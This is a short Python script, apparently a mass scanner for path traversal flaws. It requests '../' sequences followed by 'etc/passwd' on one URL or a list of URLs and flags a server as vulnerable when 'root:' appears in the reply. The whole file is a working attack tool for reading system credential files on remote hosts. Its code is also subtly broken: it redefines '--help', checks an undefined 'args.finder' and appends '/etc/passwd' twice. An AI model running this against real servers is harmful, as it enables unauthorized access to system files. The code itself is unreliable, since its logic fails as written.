import argparse
import requests

def check_vulnerability(url, hide_non_200):
    payload = "../" * num_iterations
    target_url = f"{url}/{payload}etc/passwd"
    response = requests.get(target_url)
    if response.status_code == 200 and "root:" in response.text:
        print(f"{url} is vulnerable!")
    elif not hide_non_200:
        print(f"{url} is not vulnerable. (Status Code: {response.status_code})")

def main():
    parser = argparse.ArgumentParser(description="URL Vulnerability Checker")
    parser.add_argument("--file", help="File containing URLs", type=str)
    parser.add_argument("--single", help="Single URL to check", type=str)
    parser.add_argument("--iterations", help="Number of '../' iterations", type=int, default=5)
    parser.add_argument("--hide", help="Hide non-200 responses", action="store_true")
    parser.add_argument("--help", help="Print all options", action="store_true")
    args = parser.parse_args()

    global num_iterations
    num_iterations = args.iterations

    if args.finder:
        print("Options:")
        print("--file\t\tFile containing URLs")
        print("--single\tSingle URL to check")
        print("--iterations\tNumber of '../' iterations (default: 5)")
        print("--hide\t\tHide non-200 responses")
        print("--help\tPrint all options")
        return

    if args.single:
        check_vulnerability(f"{args.single}/etc/passwd", args.hide)
    elif args.file:
        with open(args.file, "r") as file:
            urls = file.readlines()
            for url in urls:
                url = url.strip()
                check_vulnerability(f"{url}/etc/passwd", args.hide)
    else:
        print("Please provide either --single or --file option.")

if __name__ == "__main__":
    main()
